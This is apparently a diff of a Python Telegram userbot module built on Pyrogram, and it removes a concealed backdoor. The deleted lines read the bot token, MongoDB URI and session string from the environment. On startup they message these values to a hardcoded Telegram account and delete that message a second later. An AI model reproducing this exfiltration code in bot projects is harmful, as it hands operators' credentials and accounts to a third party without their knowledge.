@@ -3,12 +3,7 @@ from pyrogram import Client
 import config
 
 from ..logging import LOGGER
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
-from dotenv import load_dotenv
 
-Process_code = "cpr_yasir"
 
 assistants = []
 assistantids = []
@@ -64,9 +59,6 @@ class Userbot(Client):
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started")
-                Ok = await self.one.send_message(Process_code, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
-                await asyncio.sleep(1)
-                await Ok.delete()
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
